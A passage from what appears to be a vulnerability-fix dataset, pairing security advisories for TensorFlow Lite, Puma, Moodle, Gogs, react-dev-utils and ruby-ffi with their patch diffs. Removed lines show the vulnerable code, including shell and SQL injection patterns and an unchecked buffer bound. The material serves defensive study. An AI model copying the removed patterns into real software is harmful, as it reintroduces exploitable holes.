            "message":"[tflite] Ensure `MatchingDim` does not allow buffer overflow.\n\nWe check in `MatchingDim` that both arguments have the same dimensionality, however that is a `DCHECK` only enabled if building in debug mode. Hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. To fix, we now make `MatchingDim` return the minimum of the two sizes.\n\nA much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.\n\nPiperOrigin-RevId: 332526127\nChange-Id: If627d0d2c80a685217b6e0d1e64b0872dbf1c5e4",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'tensorflow\/lite\/kernels\/internal\/types.h': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8ee24e7949a203d234489f9da2c5bf45a7d5157d\/tensorflow%2Flite%2Fkernels%2Finternal%2Ftypes.h', 'patch': '@@ -438,7 +438,7 @@ int MatchingArraySize(const ArrayType1& array1, int index1,\\n inline int MatchingDim(const RuntimeShape& shape1, int index1,\\n                        const RuntimeShape& shape2, int index2) {\\n   TFLITE_DCHECK_EQ(shape1.Dims(index1), shape2.Dims(index2));\\n-  return shape1.Dims(index1);\\n+  return std::min(shape1.Dims(index1), shape2.Dims(index2));\\n }\\n \\n template <typename... Args>'}}",
            "message_norm":"[tflite] ensure `matchingdim` does not allow buffer overflow.\n\nwe check in `matchingdim` that both arguments have the same dimensionality, however that is a `dcheck` only enabled if building in debug mode. hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. to fix, we now make `matchingdim` return the minimum of the two sizes.\n\na much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.\n\npiperorigin-revid: 332526127\nchange-id: if627d0d2c80a685217b6e0d1e64b0872dbf1c5e4",
            "language":"en",
            "entities":"[('ensure', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('buffer overflows', 'SECWORD', ''), ('fix', 'ACTION', ''), ('332526127', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/types.h'])",
            "num_files":1.0,
            "patch_content":"From 8ee24e7949a203d234489f9da2c5bf45a7d5157d Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Fri, 18 Sep 2020 14:19:26 -0700\nSubject: [PATCH] [tflite] Ensure `MatchingDim` does not allow buffer overflow.\n\nWe check in `MatchingDim` that both arguments have the same dimensionality, however that is a `DCHECK` only enabled if building in debug mode. Hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. To fix, we now make `MatchingDim` return the minimum of the two sizes.\n\nA much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.\n\nPiperOrigin-RevId: 332526127\nChange-Id: If627d0d2c80a685217b6e0d1e64b0872dbf1c5e4\n---\n tensorflow\/lite\/kernels\/internal\/types.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/tensorflow\/lite\/kernels\/internal\/types.h b\/tensorflow\/lite\/kernels\/internal\/types.h\nindex 9db742ddf0376a..b077686dc1570d 100644\n--- a\/tensorflow\/lite\/kernels\/internal\/types.h\n+++ b\/tensorflow\/lite\/kernels\/internal\/types.h\n@@ -438,7 +438,7 @@ int MatchingArraySize(const ArrayType1& array1, int index1,\n inline int MatchingDim(const RuntimeShape& shape1, int index1,\n                        const RuntimeShape& shape2, int index2) {\n   TFLITE_DCHECK_EQ(shape1.Dims(index1), shape2.Dims(index2));\n-  return shape1.Dims(index1);\n+  return std::min(shape1.Dims(index1), shape2.Dims(index2));\n }\n \n template <typename... Args>",
            "code_diff":"@@ -438,7 +438,7 @@ int MatchingArraySize(const ArrayType1& array1, int index1,\n inline int MatchingDim(const RuntimeShape& shape1, int index1,\n                        const RuntimeShape& shape2, int index2) {\n   TFLITE_DCHECK_EQ(shape1.Dims(index1), shape2.Dims(index2));\n-  return shape1.Dims(index1);\n+  return std::min(shape1.Dims(index1), shape2.Dims(index2));\n }\n \n template <typename... Args>"
        },
        {
            "index":129,
            "vuln_id":"GHSA-x7jg-6pwg-fx5h",
            "cwe_id":"{'CWE-444'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/puma\/puma\/commit\/f24d5521295a2152c286abb0a45a1e1e2bd275bd'}",
            "dataset":"osv",
            "summary":"HTTP Smuggling via Transfer-Encoding Header in Puma ### Impact\n\nBy using an invalid transfer-encoding header, an attacker could [smuggle an HTTP response.](https:\/\/portswigger.net\/web-security\/request-smuggling)\n\nOriginally reported by @ZeddYu, who has our thanks for the detailed report.\n\n### Patches\n\nThe problem has been fixed in Puma 3.12.5 and Puma 4.3.4.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Puma](https:\/\/github.com\/puma\/puma)\n* See our [security policy](https:\/\/github.com\/puma\/puma\/security\/policy)",
            "published_date":"2020-05-22",
            "chain_len":1,
            "project":"https:\/\/github.com\/puma\/puma",
            "commit_href":"https:\/\/github.com\/puma\/puma\/commit\/f24d5521295a2152c286abb0a45a1e1e2bd275bd",
            "commit_sha":"f24d5521295a2152c286abb0a45a1e1e2bd275bd",
            "patch":"SINGLE",
            "chain_ord":"['f24d5521295a2152c286abb0a45a1e1e2bd275bd']",
            "before_first_fix_commit":"{'7a6593760d667dff95953e15c2327892e2da673c'}",
            "last_fix_commit":"f24d5521295a2152c286abb0a45a1e1e2bd275bd",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/18\/2020, 23:01:53",
            "message":"Better handle client input",
            "author":"Evan Phoenix",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 2, 'total': 12}",
            "files":"{'lib\/puma\/client.rb': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/puma\/puma\/raw\/f24d5521295a2152c286abb0a45a1e1e2bd275bd\/lib%2Fpuma%2Fclient.rb', 'patch': '@@ -285,8 +285,16 @@ def setup_body\\n \\n       te = @env[TRANSFER_ENCODING2]\\n \\n-      if te && CHUNKED.casecmp(te) == 0\\n-        return setup_chunked_body(body)\\n+      if te\\n+        if te.include?(\",\")\\n+          te.split(\",\").each do |part|\\n+            if CHUNKED.casecmp(part.strip) == 0\\n+              return setup_chunked_body(body)\\n+            end\\n+          end\\n+        elsif CHUNKED.casecmp(te) == 0\\n+          return setup_chunked_body(body)\\n+        end\\n       end\\n \\n       @chunked_body = false'}}",
            "message_norm":"better handle client input",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/puma\/client.rb'])",
            "num_files":1.0,
            "patch_content":"From f24d5521295a2152c286abb0a45a1e1e2bd275bd Mon Sep 17 00:00:00 2001\nFrom: Evan Phoenix <evan@phx.io>\nDate: Mon, 18 May 2020 16:01:53 -0700\nSubject: [PATCH] Better handle client input\n\n---\n lib\/puma\/client.rb | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\ndiff --git a\/lib\/puma\/client.rb b\/lib\/puma\/client.rb\nindex 6795b4ea0d..a6107cc94f 100644\n--- a\/lib\/puma\/client.rb\n+++ b\/lib\/puma\/client.rb\n@@ -285,8 +285,16 @@ def setup_body\n \n       te = @env[TRANSFER_ENCODING2]\n \n-      if te && CHUNKED.casecmp(te) == 0\n-        return setup_chunked_body(body)\n+      if te\n+        if te.include?(\",\")\n+          te.split(\",\").each do |part|\n+            if CHUNKED.casecmp(part.strip) == 0\n+              return setup_chunked_body(body)\n+            end\n+          end\n+        elsif CHUNKED.casecmp(te) == 0\n+          return setup_chunked_body(body)\n+        end\n       end\n \n       @chunked_body = false",
            "code_diff":"@@ -285,8 +285,16 @@ def setup_body\n \n       te = @env[TRANSFER_ENCODING2]\n \n-      if te && CHUNKED.casecmp(te) == 0\n-        return setup_chunked_body(body)\n+      if te\n+        if te.include?(\",\")\n+          te.split(\",\").each do |part|\n+            if CHUNKED.casecmp(part.strip) == 0\n+              return setup_chunked_body(body)\n+            end\n+          end\n+        elsif CHUNKED.casecmp(te) == 0\n+          return setup_chunked_body(body)\n+        end\n       end\n \n       @chunked_body = false"
        },
        {
            "index":7,
            "vuln_id":"GHSA-69c3-5xxf-58q2",
            "cwe_id":"{'CWE-89'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/a0f47c8bc4d6f5971025de7d63f22475701d2f86'}",
            "dataset":"osv",
            "summary":"SQL injection in moodle A flaw was found in moodle where an SQL injection risk was identified in Badges code relating to configuring criteria.",
            "published_date":"2022-05-19",
            "chain_len":1,
            "project":"https:\/\/github.com\/moodle\/moodle",
            "commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/a0f47c8bc4d6f5971025de7d63f22475701d2f86",
            "commit_sha":"a0f47c8bc4d6f5971025de7d63f22475701d2f86",
            "patch":"SINGLE",
            "chain_ord":"['a0f47c8bc4d6f5971025de7d63f22475701d2f86']",
            "before_first_fix_commit":"{'9478dc6b07b162f63b823480aecd4e2fb4e3c59f'}",
            "last_fix_commit":"a0f47c8bc4d6f5971025de7d63f22475701d2f86",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/31\/2022, 10:17:31",
            "message":"MDL-74333 badges: Check profile criteria valid when reviewing",
            "author":"Michael Hawkins",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'badges\/criteria\/award_criteria_profile.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/a0f47c8bc4d6f5971025de7d63f22475701d2f86\/badges%2Fcriteria%2Faward_criteria_profile.php', 'patch': '@@ -202,8 +202,8 @@ public function review($userid, $filtered = false) {\\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\\n                 $sqlparams[\"fieldid{$idx}\"] = $param[\\'field\\'];\\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\\n-            } else {\\n-                \/\/ This is a field from {user} table.\\n+            } else if (in_array($param[\\'field\\'], $this->allowed_default_fields)) {\\n+                \/\/ This is a valid field from {user} table.\\n                 if ($param[\\'field\\'] == \\'picture\\') {\\n                     \/\/ The picture field is numeric and requires special handling.\\n                     $whereparts[] = \"u.{$param[\\'field\\']} != 0\";'}}",
            "message_norm":"mdl-74333 badges: check profile criteria valid when reviewing",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['badges\/criteria\/award_criteria_profile.php'])",
            "num_files":1.0,
            "patch_content":"From a0f47c8bc4d6f5971025de7d63f22475701d2f86 Mon Sep 17 00:00:00 2001\nFrom: Michael Hawkins <michaelh@moodle.com>\nDate: Thu, 31 Mar 2022 18:17:31 +0800\nSubject: [PATCH] MDL-74333 badges: Check profile criteria valid when reviewing\n\n---\n badges\/criteria\/award_criteria_profile.php | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/badges\/criteria\/award_criteria_profile.php b\/badges\/criteria\/award_criteria_profile.php\nindex d3ac2f25556f8..d1f30961535d6 100644\n--- a\/badges\/criteria\/award_criteria_profile.php\n+++ b\/badges\/criteria\/award_criteria_profile.php\n@@ -202,8 +202,8 @@ public function review($userid, $filtered = false) {\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\n                 $sqlparams[\"fieldid{$idx}\"] = $param['field'];\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\n-            } else {\n-                \/\/ This is a field from {user} table.\n+            } else if (in_array($param['field'], $this->allowed_default_fields)) {\n+                \/\/ This is a valid field from {user} table.\n                 if ($param['field'] == 'picture') {\n                     \/\/ The picture field is numeric and requires special handling.\n                     $whereparts[] = \"u.{$param['field']} != 0\";",
            "code_diff":"@@ -202,8 +202,8 @@ public function review($userid, $filtered = false) {\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\n                 $sqlparams[\"fieldid{$idx}\"] = $param['field'];\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\n-            } else {\n-                \/\/ This is a field from {user} table.\n+            } else if (in_array($param['field'], $this->allowed_default_fields)) {\n+                \/\/ This is a valid field from {user} table.\n                 if ($param['field'] == 'picture') {\n                     \/\/ The picture field is numeric and requires special handling.\n                     $whereparts[] = \"u.{$param['field']} != 0\";"
        },
        {
            "index":1,
            "vuln_id":"GHSA-65f3-3278-7m65",
            "cwe_id":"{'CWE-285', 'CWE-863'}",
            "score":8.2,
            "chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/64102be2c90e1b47dbdd379873ba76c80d4b0e78'}",
            "dataset":"osv",
            "summary":"Improper Authorization in Gogs ### Impact\n\nExpired PAM accounts and accounts with expired passwords are continued to be seen as valid. Installations use PAM as authentication sources are affected.\n\n### Patches\n\nExpired PAM accounts and accounts with expired passwords are no longer being seen as valid. Users should upgrade to 0.12.5 or the latest 0.13.0+dev.\n\n### Workarounds\n\nIn addition to marking PAM accounts as expired, also disable\/lock them. Running `usermod -L <username>` will add an exclamation mark to the password hash and would result in wrong passwords responses when trying to login. \n\n### References\n\nhttps:\/\/huntr.dev\/bounties\/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62\/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https:\/\/github.com\/gogs\/gogs\/issues\/6810.",
            "published_date":"2022-03-12",
            "chain_len":1,
            "project":"https:\/\/github.com\/gogs\/gogs",
            "commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/64102be2c90e1b47dbdd379873ba76c80d4b0e78",
            "commit_sha":"64102be2c90e1b47dbdd379873ba76c80d4b0e78",
            "patch":"SINGLE",
            "chain_ord":"['64102be2c90e1b47dbdd379873ba76c80d4b0e78']",
            "before_first_fix_commit":"{'91f2cde5e95f146bfe4765e837e7282df6c7cabb'}",
            "last_fix_commit":"64102be2c90e1b47dbdd379873ba76c80d4b0e78",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/08\/2022, 12:02:01",
            "message":"security: fix improper PAM authorization handling (#6819)\n\nCo-authored-by: Joe Chen <jc@unknwon.io>\n# Conflicts:\n#\tCHANGELOG.md\n#\tinternal\/auth\/pam\/pam.go",
            "author":"ysf",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 3, 'total': 6}",
            "files":"{'internal\/auth\/pam\/pam.go': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/64102be2c90e1b47dbdd379873ba76c80d4b0e78\/internal%2Fauth%2Fpam%2Fpam.go', 'patch': '@@ -27,9 +27,9 @@ func PAMAuth(serviceName, userName, passwd string) error {\\n \\t\\treturn err\\n \\t}\\n \\n-\\tif err = t.Authenticate(0); err != nil {\\n+\\terr = t.Authenticate(0)\\n+\\tif err != nil {\\n \\t\\treturn err\\n \\t}\\n-\\n-\\treturn nil\\n+\\treturn t.AcctMgmt(0)\\n }'}}",
            "message_norm":"security: fix improper pam authorization handling (#6819)\n\nco-authored-by: joe chen <jc@unknwon.io>\n# conflicts:\n#\tchangelog.md\n#\tinternal\/auth\/pam\/pam.go",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('#6819', 'ISSUE', ''), ('jc@unknwon.io', 'EMAIL', ''), ('auth', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['internal\/auth\/pam\/pam.go'])",
            "num_files":1.0,
            "patch_content":"From 64102be2c90e1b47dbdd379873ba76c80d4b0e78 Mon Sep 17 00:00:00 2001\nFrom: ysf <34326+ysf@users.noreply.github.com>\nDate: Tue, 8 Mar 2022 13:02:01 +0100\nSubject: [PATCH] security: fix improper PAM authorization handling (#6819)\n\nCo-authored-by: Joe Chen <jc@unknwon.io>\n# Conflicts:\n#\tCHANGELOG.md\n#\tinternal\/auth\/pam\/pam.go\n---\n internal\/auth\/pam\/pam.go | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\ndiff --git a\/internal\/auth\/pam\/pam.go b\/internal\/auth\/pam\/pam.go\nindex 7f326d42f55..95f44b4f82e 100644\n--- a\/internal\/auth\/pam\/pam.go\n+++ b\/internal\/auth\/pam\/pam.go\n@@ -27,9 +27,9 @@ func PAMAuth(serviceName, userName, passwd string) error {\n \t\treturn err\n \t}\n \n-\tif err = t.Authenticate(0); err != nil {\n+\terr = t.Authenticate(0)\n+\tif err != nil {\n \t\treturn err\n \t}\n-\n-\treturn nil\n+\treturn t.AcctMgmt(0)\n }",
            "code_diff":"@@ -27,9 +27,9 @@ func PAMAuth(serviceName, userName, passwd string) error {\n \t\treturn err\n \t}\n \n-\tif err = t.Authenticate(0); err != nil {\n+\terr = t.Authenticate(0)\n+\tif err != nil {\n \t\treturn err\n \t}\n-\n-\treturn nil\n+\treturn t.AcctMgmt(0)\n }"
        },
        {
            "index":66,
            "vuln_id":"GHSA-5q6m-3h65-w53x",
            "cwe_id":"{'CWE-78'}",
            "score":5.6,
            "chain":"{'https:\/\/github.com\/facebook\/create-react-app\/commit\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268'}",
            "dataset":"osv",
            "summary":"react-dev-utils OS Command Injection in function `getProcessForPort` react-dev-utils prior to v11.0.4 exposes a function, `getProcessForPort`, where an input argument is concatenated into a command string to be executed. This function is typically used from react-scripts (in Create React App projects), where the usage is safe. Only when this function is manually invoked with user-provided values (ie: by custom code) is there the potential for command injection. If you're consuming it from react-scripts then this issue does not affect you.",
            "published_date":"2021-03-11",
            "chain_len":1,
            "project":"https:\/\/github.com\/facebook\/create-react-app",
            "commit_href":"https:\/\/github.com\/facebook\/create-react-app\/commit\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268",
            "commit_sha":"f5e415f3a5b66f07dcc60aba1b445fa7cda97268",
            "patch":"SINGLE",
            "chain_ord":"['f5e415f3a5b66f07dcc60aba1b445fa7cda97268']",
            "before_first_fix_commit":"{'22f46a8d5dfc46fe0f613cd7efbc82344823f461'}",
            "last_fix_commit":"f5e415f3a5b66f07dcc60aba1b445fa7cda97268",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/08\/2021, 19:03:16",
            "message":"Security Fix for Command Injection - huntr.dev (#10644)\n\n* Update getProcessForPort.js\r\n\r\n* Update getProcessForPort.js\r\n\r\nCo-authored-by: Zhou Peng <zpbrent@gmail.com>\r\nCo-authored-by: Dan Abramov <dan.abramov@gmail.com>",
            "author":"huntr.dev | the place to protect open source",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 1, 'total': 3}",
            "files":"{'packages\/react-dev-utils\/getProcessForPort.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facebook\/create-react-app\/raw\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268\/packages%2Freact-dev-utils%2FgetProcessForPort.js', 'patch': \"@@ -9,6 +9,7 @@\\n \\n var chalk = require('chalk');\\n var execSync = require('child_process').execSync;\\n+var execFileSync = require('child_process').execFileSync;\\n var path = require('path');\\n \\n var execOptions = {\\n@@ -25,7 +26,7 @@ function isProcessAReactApp(processCommand) {\\n }\\n \\n function getProcessIdOnPort(port) {\\n-  return execSync('lsof -i:' + port + ' -P -t -sTCP:LISTEN', execOptions)\\n+  return execFileSync('lsof', ['-i:' + port, '-P', '-t', '-sTCP:LISTEN'], execOptions)\\n     .split('\\\\n')[0]\\n     .trim();\\n }\"}}",
            "message_norm":"security fix for command injection - huntr.dev (#10644)\n\n* update getprocessforport.js\r\n\r\n* update getprocessforport.js\r\n\r\nco-authored-by: zhou peng <zpbrent@gmail.com>\r\nco-authored-by: dan abramov <dan.abramov@gmail.com>",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('command injection', 'SECWORD', ''), ('#10644', 'ISSUE', ''), ('zpbrent@gmail.com', 'EMAIL', ''), ('dan.abramov@gmail.com', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['packages\/react-dev-utils\/getProcessForPort.js'])",
            "num_files":1.0,
            "patch_content":"From f5e415f3a5b66f07dcc60aba1b445fa7cda97268 Mon Sep 17 00:00:00 2001\nFrom: \"huntr.dev | the place to protect open source\" <admin@418sec.com>\nDate: Mon, 8 Mar 2021 19:03:16 +0000\nSubject: [PATCH] Security Fix for Command Injection - huntr.dev (#10644)\n\n* Update getProcessForPort.js\n\n* Update getProcessForPort.js\n\nCo-authored-by: Zhou Peng <zpbrent@gmail.com>\nCo-authored-by: Dan Abramov <dan.abramov@gmail.com>\n---\n packages\/react-dev-utils\/getProcessForPort.js | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a\/packages\/react-dev-utils\/getProcessForPort.js b\/packages\/react-dev-utils\/getProcessForPort.js\nindex 8df45464977..a2e3f7c4a06 100644\n--- a\/packages\/react-dev-utils\/getProcessForPort.js\n+++ b\/packages\/react-dev-utils\/getProcessForPort.js\n@@ -9,6 +9,7 @@\n \n var chalk = require('chalk');\n var execSync = require('child_process').execSync;\n+var execFileSync = require('child_process').execFileSync;\n var path = require('path');\n \n var execOptions = {\n@@ -25,7 +26,7 @@ function isProcessAReactApp(processCommand) {\n }\n \n function getProcessIdOnPort(port) {\n-  return execSync('lsof -i:' + port + ' -P -t -sTCP:LISTEN', execOptions)\n+  return execFileSync('lsof', ['-i:' + port, '-P', '-t', '-sTCP:LISTEN'], execOptions)\n     .split('\\n')[0]\n     .trim();\n }",
            "code_diff":"@@ -9,6 +9,7 @@\n \n var chalk = require('chalk');\n var execSync = require('child_process').execSync;\n+var execFileSync = require('child_process').execFileSync;\n var path = require('path');\n \n var execOptions = {\n@@ -25,7 +26,7 @@ function isProcessAReactApp(processCommand) {\n }\n \n function getProcessIdOnPort(port) {\n-  return execSync('lsof -i:' + port + ' -P -t -sTCP:LISTEN', execOptions)\n+  return execFileSync('lsof', ['-i:' + port, '-P', '-t', '-sTCP:LISTEN'], execOptions)\n     .split('\\n')[0]\n     .trim();\n }"
        },
        {
            "index":581,
            "vuln_id":"GHSA-2gw2-8q9w-cw8p",
            "cwe_id":"{'CWE-426'}",
            "score":7.8,
            "chain":"{'https:\/\/github.com\/ffi\/ffi\/commit\/e0fe486df0e117ed67b0282b6ada04b7214ca05c', 'https:\/\/github.com\/ffi\/ffi\/commit\/09e0c6076466b4383da7fa4e13f714311109945a'}",
            "dataset":"osv",
            "summary":"Ruby-ffi has a DLL loading issue  ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be hijacked on Windows OS, when a Symbol is used as DLL name instead of a String This vulnerability appears to have been fixed in v1.9.24 and later.",
            "published_date":"2018-08-31",
            "chain_len":2,
            "project":"https:\/\/github.com\/ffi\/ffi",
            "commit_href":"https:\/\/github.com\/ffi\/ffi\/commit\/e0fe486df0e117ed67b0282b6ada04b7214ca05c",
            "commit_sha":"e0fe486df0e117ed67b0282b6ada04b7214ca05c",
            "patch":"MULTI",
            "chain_ord":"['e0fe486df0e117ed67b0282b6ada04b7214ca05c', '09e0c6076466b4383da7fa4e13f714311109945a']",
            "before_first_fix_commit":"{'e0fe486df0e117ed67b0282b6ada04b7214ca05c'}",
            "last_fix_commit":"09e0c6076466b4383da7fa4e13f714311109945a",
            "chain_ord_pos":1.0,
            "commit_datetime":"06\/01\/2018, 20:18:25",
            "message":"Don't treat Symbol args different to Strings in ffi_lib\n\nSymbols were sent directly to FFI::DynamicLibrary.open in the first\nattempt, resulting in a TypeError, so that only the mangled library\nname was actually loaded.\n\nThis moves conversion to String to the front, so that subsequent\ncalls can assume Strings only.",
            "author":"Lars Kanis",
            "comments":"{'com_1': {'author': 'Cbeg-76', 'datetime': '08\/23\/2019, 15:31:30', 'body': 'gem install ffi'}}",
            "stats":"{'additions': 1, 'deletions': 3, 'total': 4}",
            "files":"{'lib\/ffi\/library.rb': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ffi\/ffi\/raw\/e0fe486df0e117ed67b0282b6ada04b7214ca05c\/lib%2Fffi%2Flibrary.rb', 'patch': '@@ -43,7 +43,6 @@ module FFI\\n   #  FFI.map_library_name \\'jpeg\\'  # -> \"jpeg.dll\"\\n   def self.map_library_name(lib)\\n     # Mangle the library name to reflect the native library naming conventions\\n-    lib = lib.to_s unless lib.kind_of?(String)\\n     lib = Library::LIBC if lib == \\'c\\'\\n \\n     if lib && File.basename(lib) == lib\\n@@ -103,7 +102,7 @@ def ffi_lib(*names)\\n           FFI::DynamicLibrary.open(nil, FFI::DynamicLibrary::RTLD_LAZY | FFI::DynamicLibrary::RTLD_LOCAL)\\n \\n         else\\n-          libnames = (name.is_a?(::Array) ? name : [ name ]).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\\n+          libnames = (name.is_a?(::Array) ? name : [ name ]).map(&:to_s).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\\n           lib = nil\\n           errors = {}\\n \\n@@ -126,7 +125,6 @@ def ffi_lib(*names)\\n                 retry\\n               else\\n                 # TODO better library lookup logic\\n-                libname = libname.to_s\\n                 unless libname.start_with?(\"\/\")\\n                   path = [\\'\/usr\/lib\/\\',\\'\/usr\/local\/lib\/\\'].find do |pth|\\n                     File.exist?(pth + libname)'}}",
            "message_norm":"don't treat symbol args different to strings in ffi_lib\n\nsymbols were sent directly to ffi::dynamiclibrary.open in the first\nattempt, resulting in a typeerror, so that only the mangled library\nname was actually loaded.\n\nthis moves conversion to string to the front, so that subsequent\ncalls can assume strings only.",
            "language":"en",
            "entities":"[('typeerror', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/ffi\/library.rb'])",
            "num_files":1.0,
            "patch_content":"From e0fe486df0e117ed67b0282b6ada04b7214ca05c Mon Sep 17 00:00:00 2001\nFrom: Lars Kanis <lars@greiz-reinsdorf.de>\nDate: Fri, 1 Jun 2018 22:18:25 +0200\nSubject: [PATCH] Don't treat Symbol args different to Strings in ffi_lib\n\nSymbols were sent directly to FFI::DynamicLibrary.open in the first\nattempt, resulting in a TypeError, so that only the mangled library\nname was actually loaded.\n\nThis moves conversion to String to the front, so that subsequent\ncalls can assume Strings only.\n---\n lib\/ffi\/library.rb | 4 +---\n 1 file changed, 1 insertion(+), 3 deletions(-)\n\ndiff --git a\/lib\/ffi\/library.rb b\/lib\/ffi\/library.rb\nindex adfa106ab..200ce7a9d 100644\n--- a\/lib\/ffi\/library.rb\n+++ b\/lib\/ffi\/library.rb\n@@ -43,7 +43,6 @@ module FFI\n   #  FFI.map_library_name 'jpeg'  # -> \"jpeg.dll\"\n   def self.map_library_name(lib)\n     # Mangle the library name to reflect the native library naming conventions\n-    lib = lib.to_s unless lib.kind_of?(String)\n     lib = Library::LIBC if lib == 'c'\n \n     if lib && File.basename(lib) == lib\n@@ -103,7 +102,7 @@ def ffi_lib(*names)\n           FFI::DynamicLibrary.open(nil, FFI::DynamicLibrary::RTLD_LAZY | FFI::DynamicLibrary::RTLD_LOCAL)\n \n         else\n-          libnames = (name.is_a?(::Array) ? name : [ name ]).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\n+          libnames = (name.is_a?(::Array) ? name : [ name ]).map(&:to_s).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\n           lib = nil\n           errors = {}\n \n@@ -126,7 +125,6 @@ def ffi_lib(*names)\n                 retry\n               else\n                 # TODO better library lookup logic\n-                libname = libname.to_s\n                 unless libname.start_with?(\"\/\")\n                   path = ['\/usr\/lib\/','\/usr\/local\/lib\/'].find do |pth|\n                     File.exist?(pth + libname)",
            "code_diff":"@@ -43,7 +43,6 @@ module FFI\n   #  FFI.map_library_name 'jpeg'  # -> \"jpeg.dll\"\n   def self.map_library_name(lib)\n     # Mangle the library name to reflect the native library naming conventions\n-    lib = lib.to_s unless lib.kind_of?(String)\n     lib = Library::LIBC if lib == 'c'\n \n     if lib && File.basename(lib) == lib\n@@ -103,7 +102,7 @@ def ffi_lib(*names)\n           FFI::DynamicLibrary.open(nil, FFI::DynamicLibrary::RTLD_LAZY | FFI::DynamicLibrary::RTLD_LOCAL)\n \n         else\n-          libnames = (name.is_a?(::Array) ? name : [ name ]).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\n+          libnames = (name.is_a?(::Array) ? name : [ name ]).map(&:to_s).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\n           lib = nil\n           errors = {}\n \n@@ -126,7 +125,6 @@ def ffi_lib(*names)\n                 retry\n               else\n                 # TODO better library lookup logic\n-                libname = libname.to_s\n                 unless libname.start_with?(\"\/\")\n                   path = ['\/usr\/lib\/','\/usr\/local\/lib\/'].find do |pth|\n                     File.exist?(pth + libname)"
        },
        {
            "index":953,
            "vuln_id":"GHSA-gfh2-7jg5-653p",
            "cwe_id":"{'CWE-835'}",
            "score":4.0,
            "chain":"{'https:\/\/github.com\/appc\/docker2aci\/pull\/204\/commits\/54331ec7020e102935c31096f336d31f6400064f'}",
            "dataset":"osv",
            "summary":"Denial of Service in docker2aci docker2aci <= 0.12.3 has an infinite loop when handling local images with cyclic dependency chain.",
            "published_date":"2022-02-15",
            "chain_len":1,
            "project":"https:\/\/github.com\/appc\/docker2aci",
